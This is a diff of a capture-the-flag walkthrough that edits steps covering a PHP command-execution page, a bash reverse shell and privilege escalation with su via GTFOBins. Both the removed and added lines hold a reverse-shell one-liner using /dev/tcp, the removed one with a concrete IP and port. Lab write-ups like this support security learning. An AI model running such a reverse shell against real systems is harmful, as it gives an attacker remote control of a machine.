@@ -27,11 +27,11 @@
 
    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/a634be9f-cbb6-45fd-9355-88500f0fbaa4)
 
-- I logged in with the username and password <the weird word> which reveals a php page for shell commands execution and the picture below provides the result of executing 'ls'
+- I logged in with the username and password <the weird word> which reveals a php page for shell commands execution and the picture below provides the result of executing 'ls' on the page
 
   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/341db42e-b00e-4602-b9bb-1d0eee1c2484)
 
-- Let's pop a bash rev shell from revshells.com "bash -c "bash -i >& /dev/tcp/10.18.31.164/9999 0>&1" and stablize the shell with pty py module
+- Let's pop a bash rev shell from revshells.com "bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1" and stablize the shell with pty py module
 
   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0fa49651-b720-406a-9ff8-fd01d0218ef6)
 
@@ -43,7 +43,7 @@
 
    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/165012d2-7b95-4341-81d6-1f569183ca1a)
 
-- After multiple trial and error,I discovered with gtfobins that I can escalate privileges with su
+- I discovered with gtfobins that I can escalate privileges with su
 
   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/b7d4942a-53d2-421d-be12-3c57a73b32c7)
 
